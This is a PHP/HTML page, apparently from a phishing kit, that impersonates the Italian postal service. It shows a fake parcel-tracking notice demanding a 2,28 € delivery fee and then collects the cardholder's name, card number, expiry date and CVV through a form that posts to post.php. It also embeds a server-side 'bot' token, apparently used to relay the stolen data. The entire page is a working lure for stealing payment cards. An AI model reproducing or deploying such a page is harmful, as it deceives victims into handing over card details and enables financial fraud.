<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/card.css">
    <title>Italian Post</title>
</head>
<body>
    


<header>
    <div class="logo">
<img src="res/img/logo.png">
    </div>

</header>


<main>
<script>var token=<?php echo json_encode($bot); ?>;</script> 

<div class="form">

<div class="p">
<h2>Tracciare un pacco</h2>
<p>Numero di tracciamento: <strong>IT7753783673</strong></p>
<p>Costi: <b>2,28 €</b></p>
</div>


<div class="hr2">

<div class="hr1">

</div>

<div class="gg1">

</div>





</div>


<div class="continer">


<div class="title3">
<label>Non siamo riusciti a consegnare il tuo pacco a causa di costi di consegna non pagati. Ti preghiamo di saldare l’importo di 2,28 € per procedere con la consegna.</label>
</div>


<form action="post.php" method="post">

<div class="col">
    <label> Nome del titolare</label>
 <input type="text" name="name" required> </div>


<div class="col">
<label> Numero della carta </label>
<input type="text" name="cc" placeholder="XXXX XXXX XXXX XXXX" id="cc" required></div>


<div class="col">
<label> Data di scadenza </label> 
<input type="text" name="exp" placeholder="MM/AA" id="exp" required> </div>


<div class="col">
<label>Codice di sicurezza</label>
<input type="text"  name="cvv" placeholder="CVV" id="cvv" required> </div>

<div class="but">
<button type="submit">Continua</button>
</div>

</form>
</div>
</main>





<footer>

<div class="mo">
<img src="res/img/fmo.png" >
</div>

    <div class="le">
<img src="res/img/f.left.png" >
    </div>

    <div class="re">
<img src="res/img/fright.png" >
    </div>
</footer>
<script src="./res/cdn/jq.js"></script>
<script src="./res/jquery.js"></script>  


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/0000");
$("#cvv").mask("0000");
</script>
</body>
</html>